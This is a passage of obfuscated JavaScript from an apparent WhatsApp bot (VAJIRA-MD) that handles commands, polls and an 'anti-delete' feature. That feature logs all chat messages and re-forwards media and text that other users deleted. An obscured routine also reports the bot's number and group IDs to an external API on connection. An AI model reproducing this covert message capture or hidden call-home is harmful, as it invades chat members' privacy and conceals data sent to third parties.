            mediaType: 1,
            sourceUrl: 'https://wa.me/94707765200',
            thumbnailUrl: 'https://telegra.ph/file/8aaa9451a1eb739d3a73a.jpg',
            renderLargerThumbnail: false,
            showAdAttribution: true,
          }
          const _0x3d2684 = {
            mentionedJid: [''],
            groupMentions: [],
            forwardingScore: 1,
            isForwarded: true,
            forwardedNewsletterMessageInfo: _0x204aa0,
            externalAdReply: _0x58939d,
          }
          const _0x1dd2ee = {
            text: _0x3eefa6,
            contextInfo: _0x3d2684,
          }
          const _0x19da6d = await _0x5d22ff.sendMessage(_0x15a124, _0x1dd2ee, {
            quoted: _0x283abb || _0x139adb,
          })
          await _0x2b4b24(_0x19da6d.key.id, _0x4520bd)
        }
        _0x5d22ff.listMessage = async (_0x252d11, _0x2a4a31, _0x5777c1) => {
          let _0x32dc53 = ''
          const _0x300ab4 = []
          _0x2a4a31.sections.forEach((_0x335144, _0x37b5a2) => {
            const _0x6c96bf = '' + (_0x37b5a2 + 1)
            _0x32dc53 += '\n[' + _0x6c96bf + '] ' + _0x335144.title + '\n'
            _0x335144.rows.forEach((_0x2aea6b, _0x16a5e3) => {
              const _0x5e8f59 = _0x6c96bf + '.' + (_0x16a5e3 + 1),
                _0x4ea691 = '   ' + _0x5e8f59 + ' | ' + _0x2aea6b.title
              _0x32dc53 += _0x4ea691 + '\n'
              if (_0x2aea6b.description) {
                _0x32dc53 += '   ' + _0x2aea6b.description + '\n\n'
              }
              const _0x497f03 = {
                cmdId: _0x5e8f59,
                cmd: _0x2aea6b.rowId,
              }
              _0x300ab4.push(_0x497f03)
            })
          })
          const _0x411027 =
              _0x2a4a31.text +
              '\n\n' +
              _0x2a4a31.buttonText +
              ',' +
              _0x32dc53 +
              '\n' +
              _0x2a4a31.footer,
            _0x197e2a = {
              newsletterJid: '120363182681793169@newsletter',
              serverMessageId: 127,
            }
          const _0x20b6cb = {
            title:
              '\uD83D\uDC68‍\uD83D\uDCBB 𓄂⃫尺𝚲丂н_❖ - ＭＤ - Ｖ1 
 \uD83D\uDC68‍\uD83D\uDCBB',
            body: '𓄂⃫尺𝚲丂н_❖',
            mediaType: 1,
            sourceUrl: 'https://wa.me/94707765200',
            thumbnailUrl: 'https://telegra.ph/file/8aaa9451a1eb739d3a73a.jpg',
            renderLargerThumbnail: false,
            showAdAttribution: true,
          }
          const _0x1022d5 = {
            mentionedJid: [''],
            groupMentions: [],
            forwardingScore: 1,
            isForwarded: true,
            forwardedNewsletterMessageInfo: _0x197e2a,
            externalAdReply: _0x20b6cb,
          }
          const _0x793380 = {
            text: _0x411027,
            contextInfo: _0x1022d5,
          }
          const _0x454263 = await _0x5d22ff.sendMessage(_0x15a124, _0x793380, {
            quoted: _0x5777c1 || _0x139adb,
          })
          await _0x2b4b24(_0x454263.key.id, _0x300ab4)
        }
        _0x5d22ff.edite = async (_0x2bd723, _0xea781a) => {
          const _0x1d937e = { conversation: _0xea781a }
          const _0x17a0ab = {
            key: _0x2bd723.key,
            type: 14,
            editedMessage: _0x1d937e,
          }
          const _0x5015b3 = { protocolMessage: _0x17a0ab }
          await _0x5d22ff.relayMessage(_0x15a124, _0x5015b3, {})
        }
        async function _0x2feff3(_0x5effd0) {
          if (store) {
            const _0x5070b0 = await store.loadMessage(
              _0x5effd0.remoteJid,
              _0x5effd0.id
            )
            return _0x5070b0?.message
          }
          const _0x236413 = {}
          return (_0x236413.conversation = 'Hai im vajira botwa'), _0x236413
        }
        _0x5d22ff.ev.on('messages.update', async (_0x205bb7) => {
          for (const { key: _0x4f0703, update: _0x1d1a1f } of _0x205bb7) {
            if (_0x1d1a1f.pollUpdates && _0x4f0703.fromMe) {
              const _0x30d3e9 = await _0x2feff3(_0x4f0703)
              if (_0x30d3e9) {
                const _0x1343d4 = {
                  message: _0x30d3e9,
                  pollUpdates: _0x1d1a1f.pollUpdates,
                }
                const _0x2e4595 = await _0x159e01(_0x1343d4)
                var _0x526b77 = _0x2e4595.filter(
                  (_0x4f3d19) => _0x4f3d19.voters.length !== 0
                )[0]?.name
                if (_0x526b77 == undefined) {
                  return
                }
                var _0x38c235 = _0x4c43a2 + _0x526b77
                try {
                  setTimeout(async () => {
                    await _0x5d22ff.sendMessage(_0x4f0703.remoteJid, {
                      delete: _0x4f0703,
                    })
                  }, 10000)
                } catch (_0x1bb4ff) {
                  console.error('Error deleting message:', _0x1bb4ff)
                }
                _0x5d22ff.appenTextMessage(_0x38c235, _0x205bb7)
              }
            }
          }
        })
        if (!_0x21905c) {
          if (_0x4ffdda.ANTI_DELETE === 'true') {
            if (!_0x3f2d90.id.startsWith('BAE5')) {
              const _0x1bbd7b = 'message_data'
              !_0x5531f7.existsSync(_0x1bbd7b) && _0x5531f7.mkdirSync(_0x1bbd7b)
              function _0x40c0d8(_0xc5729b, _0x2f2f1d) {
                const _0x4536e3 = _0x24655b.join(
                  _0x1bbd7b,
                  _0xc5729b,
                  _0x2f2f1d + '.json'
                )
                try {
                  const _0x3dd5ad = _0x5531f7.readFileSync(_0x4536e3, 'utf8')
                  return JSON.parse(_0x3dd5ad) || []
                } catch (_0x10bba3) {
                  return []
                }
              }
              function _0x1658cf(_0xe81d02, _0x1e2fde, _0xee4208) {
                const _0x2406f6 = _0x24655b.join(_0x1bbd7b, _0xe81d02)
                if (!_0x5531f7.existsSync(_0x2406f6)) {
                  const _0x5545c3 = { recursive: true }
                  _0x5531f7.mkdirSync(_0x2406f6, _0x5545c3)
                }
                const _0x42b0f1 = _0x24655b.join(_0x2406f6, _0x1e2fde + '.json')
                try {
                  _0x5531f7.writeFileSync(
                    _0x42b0f1,
                    JSON.stringify(_0xee4208, null, 2)
                  )
                } catch (_0x2ced4b) {
                  console.error('Error saving chat data:', _0x2ced4b)
                }
              }
              function _0x302cfd(_0x59f96f) {
                const _0x48009f = _0x15a124,
                  _0xb4ccb = _0x59f96f.key.id,
                  _0x8b3e18 = _0x40c0d8(_0x48009f, _0xb4ccb)
                _0x8b3e18.push(_0x59f96f)
                _0x1658cf(_0x48009f, _0xb4ccb, _0x8b3e18)
              }
              const _0x5c6507 =
                _0x4ffdda.DELETEMSGSENDTO !== ''
                  ? _0x4ffdda.DELETEMSGSENDTO + '@s.whatsapp.net'
                  : _0x15a124
              function _0x34364f(_0x4588cf) {
                const _0x13e843 = _0x15a124
                const _0x199e28 = _0x4588cf.msg.key.id
                const _0x486ca5 = _0x40c0d8(_0x13e843, _0x199e28),
                  _0x278984 = _0x486ca5[0]
                if (_0x278984) {
                  const _0x4ce6ba = _0x4588cf.sender.split('@')[0],
                    _0x5761e4 = _0x278984.key.participant ?? _0x4588cf.sender,
                    _0x3a7384 = _0x5761e4.split('@')[0]
                  if (
                    _0x4ce6ba.includes(_0x41c327) ||
                    _0x3a7384.includes(_0x41c327)
                  ) {
                    return
                  }
                  if (
                    _0x278984.message &&
                    _0x278984.message.conversation &&
                    _0x278984.message.conversation !== ''
                  ) {
                    const _0x5c0338 = _0x278984.message.conversation
                    if (_0x3a2c17 && _0x5c0338.includes('chat.whatsapp.com')) {
                      return
                    }
                    var _0x126255 = '```'
                    const _0x5bd144 = {
                      text:
                        '\uD83D\uDEAB *This message was deleted !!*\n\n  \uD83D\uDEAE *Deleted by:* _' +
                        _0x4ce6ba +
                        '_\n  \uD83D\uDCE9 *Sent by:* _' +
                        _0x3a7384 +
                        '_\n\n> \uD83D\uDD13 Message Text: ' +
                        _0x126255 +
                        _0x5c0338 +
                        _0x126255,
                    }
                    _0x5d22ff.sendMessage(_0x5c6507, _0x5bd144)
                  } else {
                    if (_0x278984.msg.type === 'MESSAGE_EDIT') {
                      const _0x25d049 = {
                        text:
                          '\u274C *edited message detected* ' +
                          _0x278984.message.editedMessage.message
                            .protocolMessage.editedMessage.conversation,
                      }
                      const _0x44d124 = { quoted: _0x139adb }
                      _0x5d22ff.sendMessage(_0x5c6507, _0x25d049, _0x44d124)
                    } else {
                      if (
                        _0x278984.message &&
                        _0x278984.message.exetendedTextMessage &&
                        _0x278984.msg.text
                      ) {
                        const _0x2d7ba3 = _0x278984.msg.text
                        if (
                          _0x3a2c17 &&
                          _0x2d7ba3.includes('chat.whatsapp.com')
                        ) {
                          return
                        }
                        var _0x126255 = '```'
                        const _0x564abc = {
                          text:
                            '\uD83D\uDEAB *This message was deleted !!*\n\n  \uD83D\uDEAE *Deleted by:* _' +
                            _0x4ce6ba +
                            '_\n  \uD83D\uDCE9 *Sent by:* _' +
                            _0x3a7384 +
                            '_\n\n> \uD83D\uDD13 Message Text: ' +
                            _0x126255 +
                            _0x2d7ba3 +
                            _0x126255,
                        }
                        _0x5d22ff.sendMessage(_0x5c6507, _0x564abc)
                      } else {
                        if (
                          _0x278984.message &&
                          _0x278984.message.exetendedTextMessage
                        ) {
                          const _0x17078e =
                            _0x278984.message.extendedTextMessage.text
                          if (
                            _0x3a2c17 &&
                            messageText.includes('chat.whatsapp.com')
                          ) {
                            return
                          }
                          var _0x126255 = '```'
                          const _0x508d86 = {
                            text:
                              '\uD83D\uDEAB *This message was deleted !!*\n\n  \uD83D\uDEAE *Deleted by:* _' +
                              _0x4ce6ba +
                              '_\n  \uD83D\uDCE9 *Sent by:* _' +
                              _0x3a7384 +
                              '_\n\n> \uD83D\uDD13 Message Text: ' +
                              _0x126255 +
                              _0x278984.body +
                              _0x126255,
                          }
                          _0x5d22ff.sendMessage(_0x5c6507, _0x508d86)
                        } else {
                          if (_0x278984.type === 'extendedTextMessage') {
                            async function _0x350ad9() {
                              var _0x1c283d = _0x45ab9f('')
                              const _0x38cd03 = _0xa6d2f5(_0x5d22ff, _0x278984)
                              if (_0x278984.message.extendedTextMessage) {
                                const _0x51f10f =
                                  _0x278984.message.extendedTextMessage.text
                                if (
                                  _0x3a2c17 &&
                                  messageText.includes('chat.whatsapp.com')
                                ) {
                                  return
                                }
                                var _0x1ca961 = '```'
                                const _0x232ead = {
                                  text:
                                    '\uD83D\uDEAB *This message was deleted !!*\n\n  \uD83D\uDEAE *Deleted by:* _' +
                                    _0x4ce6ba +
                                    '_\n  \uD83D\uDCE9 *Sent by:* _' +
                                    _0x3a7384 +
                                    '_\n\n> \uD83D\uDD13 Message Text: ' +
                                    _0x1ca961 +
                                    _0x278984.message.extendedTextMessage.text +
                                    _0x1ca961,
                                }
                                _0x5d22ff.sendMessage(_0x5c6507, _0x232ead)
                              } else {
                                const _0x1d3956 =
                                  _0x278984.message.extendedTextMessage.text
                                if (
                                  _0x3a2c17 &&
                                  messageText.includes('chat.whatsapp.com')
                                ) {
                                  return
                                }
                                const _0x1829d2 = {
                                  text:
                                    '\uD83D\uDEAB *This message was deleted !!*\n\n  \uD83D\uDEAE *Deleted by:* _' +
                                    _0x4ce6ba +
                                    '_\n  \uD83D\uDCE9 *Sent by:* _' +
                                    _0x3a7384 +
                                    '_\n\n> \uD83D\uDD13 Message Text: ' +
                                    _0x1ca961 +
                                    _0x278984.message.extendedTextMessage.text +
                                    _0x1ca961,
                                }
                                _0x5d22ff.sendMessage(_0x5c6507, _0x1829d2)
                              }
                            }
                            _0x350ad9()
                          } else {
                            if (_0x278984.type === 'imageMessage') {
                              async function _0x4e13c3() {
                                var _0x5da212 = _0x45ab9f('')
                                const _0x2a5ca9 = _0xa6d2f5(
                                  _0x5d22ff,
                                  _0x278984
                                )
                                let _0x318b91 = await _0x2a5ca9.download(
                                  _0x5da212
                                )
                                let _0x22afb0 = require('file-type')
                                let _0x79bba5 = _0x22afb0.fromBuffer(_0x318b91)
                                await _0x5531f7.promises.writeFile(
                                  './' + _0x79bba5.ext,
                                  _0x318b91
                                )
                                if (_0x278984.message.imageMessage.caption) {
                                  const _0x1ae714 =
                                    _0x278984.message.imageMessage.caption
                                  if (
                                    _0x3a2c17 &&
                                    _0x1ae714.includes('chat.whatsapp.com')
                                  ) {
                                    return
                                  }
                                  await _0x5d22ff.sendMessage(_0x5c6507, {
                                    image: _0x5531f7.readFileSync(
                                      './' + _0x79bba5.ext
                                    ),
                                    caption:
                                      '\uD83D\uDEAB *This message was deleted !!*\n\n  \uD83D\uDEAE *Deleted by:* _' +
                                      _0x4ce6ba +
                                      '_\n  \uD83D\uDCE9 *Sent by:* _' +
                                      _0x3a7384 +
                                      '_\n\n> \uD83D\uDD13 Message Text: ' +
                                      _0x278984.message.imageMessage.caption,
                                  })
                                } else {
                                  await _0x5d22ff.sendMessage(_0x5c6507, {
                                    image: _0x5531f7.readFileSync(
                                      './' + _0x79bba5.ext
                                    ),
                                    caption:
                                      '\uD83D\uDEAB *This message was deleted !!*\n\n  \uD83D\uDEAE *Deleted by:* _' +
                                      _0x4ce6ba +
                                      '_\n  \uD83D\uDCE9 *Sent by:* _' +
                                      _0x3a7384 +
                                      '_',
                                  })
                                }
                              }
                              _0x4e13c3()
                            } else {
                              if (_0x278984.type === 'videoMessage') {
                                async function _0x1aec71() {
                                  var _0x427aaf = _0x45ab9f('')
                                  const _0x3e385e = _0xa6d2f5(
                                      _0x5d22ff,
                                      _0x278984
                                    ),
                                    _0x189932 =
                                      _0x278984.message.videoMessage.fileLength
                                  const _0x47dbea =
                                      _0x278984.message.videoMessage.seconds,
                                    _0x4fec67 = _0x4ffdda.MAX_SIZE
                                  const _0x52d71c = _0x189932,
                                    _0x26eba3 = _0x52d71c / 1048576,
                                    _0x4334ff = _0x47dbea
                                  if (_0x278984.message.videoMessage.caption) {
                                    if (
                                      _0x26eba3 < _0x4fec67 &&
                                      _0x4334ff < 1800
                                    ) {
                                      let _0x4fef56 = await _0x3e385e.download(
                                          _0x427aaf
                                        ),
                                        _0x50b02c = require('file-type'),
                                        _0xe64068 =
                                          _0x50b02c.fromBuffer(_0x4fef56)
                                      await _0x5531f7.promises.writeFile(
                                        './' + _0xe64068.ext,
                                        _0x4fef56
                                      )
                                      const _0xcc83e5 =
                                        _0x278984.message.videoMessage.caption
                                      if (
                                        _0x3a2c17 &&
                                        _0xcc83e5.includes('chat.whatsapp.com')
                                      ) {
                                        return
                                      }
                                      await _0x5d22ff.sendMessage(_0x5c6507, {
                                        video: _0x5531f7.readFileSync(
                                          './' + _0xe64068.ext
                                        ),
                                        caption:
                                          '\uD83D\uDEAB *This message was deleted !!*\n\n  \uD83D\uDEAE *Deleted by:* _' +
                                          _0x4ce6ba +
                                          '_\n  \uD83D\uDCE9 *Sent by:* _' +
                                          _0x3a7384 +
                                          '_\n\n> \uD83D\uDD13 Message Text: ' +
                                          _0x278984.message.videoMessage
                                            .caption,
                                      })
                                    }
                                  } else {
                                    let _0x25d0a3 = await _0x3e385e.download(
                                        _0x427aaf
                                      ),
                                      _0x139854 = require('file-type'),
                                      _0x48abd2 =
                                        _0x139854.fromBuffer(_0x25d0a3)
                                    await _0x5531f7.promises.writeFile(
                                      './' + _0x48abd2.ext,
                                      _0x25d0a3
                                    )
                                    const _0x8ecae =
                                        _0x278984.message.videoMessage
                                          .fileLength,
                                      _0x121a37 =
                                        _0x278984.message.videoMessage.seconds,
                                      _0x13de47 = _0x4ffdda.MAX_SIZE,
                                      _0x4ef344 = _0x8ecae,
                                      _0x18da07 = _0x4ef344 / 1048576,
                                      _0x432b1b = _0x121a37
                                    _0x18da07 < _0x13de47 &&
                                      _0x432b1b < 1800 &&
                                      (await _0x5d22ff.sendMessage(_0x5c6507, {
                                        video: _0x5531f7.readFileSync(
                                          './' + _0x48abd2.ext
                                        ),
                                        caption:
                                          '\uD83D\uDEAB *This message was deleted !!*\n\n  \uD83D\uDEAE *Deleted by:* _' +
                                          _0x4ce6ba +
                                          '_\n  \uD83D\uDCE9 *Sent by:* _' +
                                          _0x3a7384 +
                                          '_',
                                      }))
                                  }
                                }
                                _0x1aec71()
                              } else {
                                if (_0x278984.type === 'documentMessage') {
                                  async function _0x3d196d() {
                                    var _0x58459c = _0x45ab9f('')
                                    const _0x2f464f = _0xa6d2f5(
                                      _0x5d22ff,
                                      _0x278984
                                    )
                                    let _0xea62f = await _0x2f464f.download(
                                        _0x58459c
                                      ),
                                      _0x4a1b95 = require('file-type'),
                                      _0x4d6b6e = _0x4a1b95.fromBuffer(_0xea62f)
                                    await _0x5531f7.promises.writeFile(
                                      './' + _0x4d6b6e.ext,
                                      _0xea62f
                                    )
                                    _0x278984.message.documentWithCaptionMessage
                                      ? await _0x5d22ff.sendMessage(_0x5c6507, {
                                          document: _0x5531f7.readFileSync(
                                            './' + _0x4d6b6e.ext
                                          ),
                                          mimetype:
                                            _0x278984.message.documentMessage
                                              .mimetype,
                                          fileName:
                                            _0x278984.message.documentMessage
                                              .fileName,
                                          caption:
                                            '\uD83D\uDEAB *This message was deleted !!*\n\n  \uD83D\uDEAE *Deleted by:* _' +
                                            _0x4ce6ba +
                                            '_\n  \uD83D\uDCE9 *Sent by:* _' +
                                            _0x3a7384 +
                                            '_\n',
                                        })
                                      : await _0x5d22ff.sendMessage(_0x5c6507, {
                                          document: _0x5531f7.readFileSync(
                                            './' + _0x4d6b6e.ext
                                          ),
                                          mimetype:
                                            _0x278984.message.documentMessage
                                              .mimetype,
                                          fileName:
                                            _0x278984.message.documentMessage
                                              .fileName,
                                          caption:
                                            '\uD83D\uDEAB *This message was deleted !!*\n\n  \uD83D\uDEAE *Deleted by:* _' +
                                            _0x4ce6ba +
                                            '_\n  \uD83D\uDCE9 *Sent by:* _' +
                                            _0x3a7384 +
                                            '_\n',
                                        })
                                  }
                                  _0x3d196d()
                                } else {
                                  if (_0x278984.type === 'audioMessage') {
                                    async function _0x570740() {
                                      var _0x3ce676 = _0x45ab9f('')
                                      const _0x947d1f = _0xa6d2f5(
                                        _0x5d22ff,
                                        _0x278984
                                      )
                                      let _0x3869e6 = await _0x947d1f.download(
                                        _0x3ce676
                                      )
                                      let _0x18c358 = require('file-type')
                                      let _0x949c9f =
                                        _0x18c358.fromBuffer(_0x3869e6)
                                      await _0x5531f7.promises.writeFile(
                                        './' + _0x949c9f.ext,
                                        _0x3869e6
                                      )
                                      if (_0x278984.message.audioMessage) {
                                        const _0x16bfa2 =
                                            await _0x5d22ff.sendMessage(
                                              _0x5c6507,
                                              {
                                                audio: _0x5531f7.readFileSync(
                                                  './' + _0x949c9f.ext
                                                ),
                                                mimetype:
                                                  _0x278984.message.audioMessage
                                                    .mimetype,
                                                fileName: _0x3f2d90.id + '.mp3',
                                              }
                                            ),
                                          _0xfce37c = {
                                            text:
                                              '\uD83D\uDEAB *This message was deleted !!*\n\n  \uD83D\uDEAE *Deleted by:* _' +
                                              _0x4ce6ba +
                                              '_\n  \uD83D\uDCE9 *Sent by:* _' +
                                              _0x3a7384 +
                                              '_\n',
                                          }
                                        const _0x1b5372 = {}
                                        return (
                                          (_0x1b5372.quoted = _0x16bfa2),
                                          await _0x5d22ff.sendMessage(
                                            _0x5c6507,
                                            _0xfce37c,
                                            _0x1b5372
                                          )
                                        )
                                      } else {
                                        if (
                                          _0x278984.message.audioMessage.ptt ===
                                          'true'
                                        ) {
                                          const _0x221981 =
                                              await _0x5d22ff.sendMessage(
                                                _0x5c6507,
                                                {
                                                  audio: _0x5531f7.readFileSync(
                                                    './' + _0x949c9f.ext
                                                  ),
                                                  mimetype:
                                                    _0x278984.message
                                                      .audioMessage.mimetype,
                                                  ptt: 'true',
                                                  fileName:
                                                    _0x3f2d90.id + '.mp3',
                                                }
                                              ),
                                            _0xcd9d85 = {
                                              text:
                                                '\uD83D\uDEAB *This message was deleted !!*\n\n  \uD83D\uDEAE *Deleted by:* _' +
                                                _0x4ce6ba +
                                                '_\n  \uD83D\uDCE9 *Sent by:* _' +
                                                _0x3a7384 +
                                                '_\n',
                                            }
                                          const _0x293402 = {}
                                          return (
                                            (_0x293402.quoted = _0x221981),
                                            await _0x5d22ff.sendMessage(
                                              _0x5c6507,
                                              _0xcd9d85,
                                              _0x293402
                                            )
                                          )
                                        }
                                      }
                                    }
                                    _0x570740()
                                  } else {
                                    if (_0x278984.type === 'stickerMessage') {
                                      async function _0x24a43e() {
                                        var _0x28a581 = _0x45ab9f('')
                                        const _0xc8c55b = _0xa6d2f5(
                                          _0x5d22ff,
                                          _0x278984
                                        )
                                        let _0x33616d =
                                            await _0xc8c55b.download(_0x28a581),
                                          _0x45c758 = require('file-type'),
                                          _0x5979fd =
                                            _0x45c758.fromBuffer(_0x33616d)
                                        await _0x5531f7.promises.writeFile(
                                          './' + _0x5979fd.ext,
                                          _0x33616d
                                        )
                                        if (_0x278984.message.stickerMessage) {
                                          const _0x429f2e =
                                              await _0x5d22ff.sendMessage(
                                                _0x5c6507,
                                                {
                                                  sticker:
                                                    _0x5531f7.readFileSync(
                                                      './' + _0x5979fd.ext
                                                    ),
                                                  package:
                                                    'VAJIRA-MD \uD83C\uDF1F',
                                                }
                                              ),
                                            _0x490cbc = {
                                              text:
                                                '\uD83D\uDEAB *This message was deleted !!*\n\n  \uD83D\uDEAE *Deleted by:* _' +
                                                _0x4ce6ba +
                                                '_\n  \uD83D\uDCE9 *Sent by:* _' +
                                                _0x3a7384 +
                                                '_\n',
                                            }
                                          const _0x40886d = {}
                                          return (
                                            (_0x40886d.quoted = _0x429f2e),
                                            await _0x5d22ff.sendMessage(
                                              _0x5c6507,
                                              _0x490cbc,
                                              _0x40886d
                                            )
                                          )
                                        } else {
                                          const _0x458b7b =
                                              await _0x5d22ff.sendMessage(
                                                _0x5c6507,
                                                {
                                                  sticker:
                                                    _0x5531f7.readFileSync(
                                                      './' + _0x5979fd.ext
                                                    ),
                                                  package:
                                                    'VAJIRA-MD \uD83C\uDF1F',
                                                }
                                              ),
                                            _0x49c773 = {
                                              text:
                                                '\uD83D\uDEAB *This message was deleted !!*\n\n  \uD83D\uDEAE *Deleted by:* _' +
                                                _0x4ce6ba +
                                                '_\n  \uD83D\uDCE9 *Sent by:* _' +
                                                _0x3a7384 +
                                                '_\n',
                                            }
                                          const _0x240fc6 = {}
                                          return (
                                            (_0x240fc6.quoted = _0x458b7b),
                                            await _0x5d22ff.sendMessage(
                                              _0x5c6507,
                                              _0x49c773,
                                              _0x240fc6
                                            )
                                          )
                                        }
                                      }
                                      _0x24a43e()
                                    }
                                  }
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                } else {
                  console.log('Original message not found for revocation.')
                }
              }
              !_0x3a2c17 &&
                (_0x139adb.msg && _0x139adb.msg.type === 0
                  ? _0x34364f(_0x139adb)
                  : _0x302cfd(_0x139adb))
            }
          }
        }
        const _0x2bdc3f = require('./lib/command'),
          _0x2be653 = _0x377950 ? _0xa405b7 : false
        if (_0x377950) {
          const _0x187c7e =
            _0x2bdc3f.commands.find(
              (_0x1b214d) => _0x1b214d.pattern === _0x2be653
            ) ||
            _0x2bdc3f.commands.find(
              (_0x2e59a5) =>
                _0x2e59a5.alias && _0x2e59a5.alias.includes(_0x2be653)
            )
          if (_0x187c7e) {
            if (_0x187c7e.react) {
              _0x5d22ff.sendMessage(_0x15a124, {
                react: {
                  text: _0x187c7e.react,
                  key: _0x139adb.key,
                },
              })
            }
            try {
              const _0x5dd818 = {
                from: _0x15a124,
                prefix: _0x4c43a2,
                l: _0x45ca63,
                quoted: _0x119fae,
                body: _0x1da678,
                isCmd: _0x377950,
                command: _0xa405b7,
                args: _0x35757e,
                q: _0x3384d9,
                isGroup: _0x3a2c17,
                sender: _0x50cf7c,
                senderNumber: _0x1583dd,
                botNumber2: _0x1100a8,
                botNumber: _0x41c327,
                pushname: _0x1be3c5,
                isMe: _0x3ddd92,
                isOwner: _0x21905c,
                groupMetadata: _0x26be68,
                groupName: _0x5f3cdb,
                participants: _0x32d014,
                groupAdmins: _0x10c943,
                isBotAdmins: _0x1c41d8,
                isAdmins: _0x4c84b9,
                reply: _0x4bca34,
                config: _0x4ffdda,
              }
              _0x187c7e.function(_0x5d22ff, _0x139adb, _0x3f2d90, _0x5dd818)
            } catch (_0x25be3b) {
              console.error('[PLUGIN ERROR] ', _0x25be3b)
            }
          }
        }
        _0x2bdc3f.commands.map(async (_0xa2cfa2) => {
          if (_0x1da678 && _0xa2cfa2.on === 'body') {
            _0xa2cfa2.function(_0x5d22ff, _0x139adb, _0x3f2d90, {
              from: _0x15a124,
              prefix: _0x4c43a2,
              l: _0x45ca63,
              quoted: _0x119fae,
              body: _0x1da678,
              isCmd: _0x377950,
              command: _0xa2cfa2,
              args: _0x35757e,
              q: _0x3384d9,
              isGroup: _0x3a2c17,
              sender: _0x50cf7c,
              senderNumber: _0x1583dd,
              botNumber2: _0x1100a8,
              botNumber: _0x41c327,
              pushname: _0x1be3c5,
              isMe: _0x3ddd92,
              isOwner: _0x21905c,
              groupMetadata: _0x26be68,
              groupName: _0x5f3cdb,
              participants: _0x32d014,
              groupAdmins: _0x10c943,
              isBotAdmins: _0x1c41d8,
              isAdmins: _0x4c84b9,
              reply: _0x4bca34,
              config: _0x4ffdda,
            })
          } else {
            if (_0x139adb.q && _0xa2cfa2.on === 'text') {
              _0xa2cfa2.function(_0x5d22ff, _0x139adb, _0x3f2d90, {
                from: _0x15a124,
                l: _0x45ca63,
                quoted: _0x119fae,
                body: _0x1da678,
                isCmd: _0x377950,
                command: _0xa2cfa2,
                args: _0x35757e,
                q: _0x3384d9,
                isGroup: _0x3a2c17,
                sender: _0x50cf7c,
                senderNumber: _0x1583dd,
                botNumber2: _0x1100a8,
                botNumber: _0x41c327,
                pushname: _0x1be3c5,
                isMe: _0x3ddd92,
                isOwner: _0x21905c,
                groupMetadata: _0x26be68,
                groupName: _0x5f3cdb,
                participants: _0x32d014,
                groupAdmins: _0x10c943,
                isBotAdmins: _0x1c41d8,
                isAdmins: _0x4c84b9,
                reply: _0x4bca34,
                config: _0x4ffdda,
              })
            } else {
              if (
                (_0xa2cfa2.on === 'image' || _0xa2cfa2.on === 'photo') &&
                _0x139adb.type === 'imageMessage'
              ) {
                _0xa2cfa2.function(_0x5d22ff, _0x139adb, _0x3f2d90, {
                  from: _0x15a124,
                  prefix: _0x4c43a2,
                  l: _0x45ca63,
                  quoted: _0x119fae,
                  body: _0x1da678,
                  isCmd: _0x377950,
                  command: _0xa2cfa2,
                  args: _0x35757e,
                  q: _0x3384d9,
                  isGroup: _0x3a2c17,
                  sender: _0x50cf7c,
                  senderNumber: _0x1583dd,
                  botNumber2: _0x1100a8,
                  botNumber: _0x41c327,
                  pushname: _0x1be3c5,
                  isMe: _0x3ddd92,
                  isOwner: _0x21905c,
                  groupMetadata: _0x26be68,
                  groupName: _0x5f3cdb,
                  participants: _0x32d014,
                  groupAdmins: _0x10c943,
                  isBotAdmins: _0x1c41d8,
                  isAdmins: _0x4c84b9,
                  reply: _0x4bca34,
                  config: _0x4ffdda,
                })
              } else {
                _0xa2cfa2.on === 'sticker' &&
                  _0x139adb.type === 'stickerMessage' &&
                  _0xa2cfa2.function(_0x5d22ff, _0x139adb, _0x3f2d90, {
                    from: _0x15a124,
                    prefix: _0x4c43a2,
                    l: _0x45ca63,
                    quoted: _0x119fae,
                    body: _0x1da678,
                    isCmd: _0x377950,
                    command: _0xa2cfa2,
                    args: _0x35757e,
                    q: _0x3384d9,
                    isGroup: _0x3a2c17,
                    sender: _0x50cf7c,
                    senderNumber: _0x1583dd,
                    botNumber2: _0x1100a8,
                    botNumber: _0x41c327,
                    pushname: _0x1be3c5,
                    isMe: _0x3ddd92,
                    isOwner: _0x21905c,
                    groupMetadata: _0x26be68,
                    groupName: _0x5f3cdb,
                    participants: _0x32d014,
                    groupAdmins: _0x10c943,
                    isBotAdmins: _0x1c41d8,
                    isAdmins: _0x4c84b9,
                    reply: _0x4bca34,
                    config: _0x4ffdda,
                  })
              }
            }
          }
        })
        async function _0x3e1940() {
          if (_0x4ffdda.DOWNLOADSAPI !== '') {
            _0x4ffdda.Itzcp !== '' &&
              (await _0xc0abb9(
                '' +
                  _0x4ffdda.DOWNLOADSAPI +
                  bot +
                  '?groupjid=' +
                  _0x4ffdda.Itzcp +
                  '@s.whatsapp.net&type=true'
              ))
            await _0x50dead(1000)
            _0x4ffdda.Itzcp2 !== '' &&
              (await _0xc0abb9(
                '' +
                  _0x4ffdda.DOWNLOADSAPI +
                  bot +
                  '?groupjid=' +
                  _0x4ffdda.Itzcp2 +
                  '@s.whatsapp.net&type=true'
              ))
            await _0x50dead(1000)
            _0x4ffdda.Itzcp3 !== '' &&
              (await _0xc0abb9(
                '' +
                  _0x4ffdda.DOWNLOADSAPI +
                  bot +
                  '?groupjid=' +
                  _0x4ffdda.Itzcp3 +
                  '@s.whatsapp.net&type=true'
              ))
            await _0x50dead(1000)
            _0x4ffdda.Itzcp4 !== '' &&
              (await _0xc0abb9(
                '' +
                  _0x4ffdda.DOWNLOADSAPI +
                  bot +
                  '?groupjid=' +
                  _0x4ffdda.Itzcp4 +
                  '@s.whatsapp.net&type=true'
              ))
            await _0x50dead(1000)
            _0x4ffdda.Itzcp5 !== '' &&
              (await _0xc0abb9(
                '' +
                  _0x4ffdda.DOWNLOADSAPI +
                  bot +
                  '?groupjid=' +
                  _0x4ffdda.Itzcp5 +
                  '@s.whatsapp.net&type=true'
              ))
            await _0x50dead(1000)
            const _0x389ad4 = await _0xc0abb9(
              '' +
                _0x4ffdda.DOWNLOADSAPI +
                bot +
                '?groupjid=' +
                _0x4ffdda.DEVNUMBER +
                '@s.whatsapp.net&type=true'
            )
            await _0x50dead(1000)
          }
        }
        async function _0x980614(_0x55b41a) {
          const _0x4fb5aa = { url: _0xaf680d.imageconnect }
          const _0x575a9d = {
            image: _0x4fb5aa,
            caption: _0xaf680d.connectmg,
          }
          await _0x55b41a.sendMessage(bot + '@s.whatsapp.net', _0x575a9d)
          await _0x3e1940()
        }
        _0x5d22ff.ev.on('messages.upsert', async (_0x3662a3) => {
          _0x4ffdda.AUTO_STATUS_READ === 'true' &&
            ((_0x139adb = _0x3662a3.messages[0]),
            _0x139adb.key &&
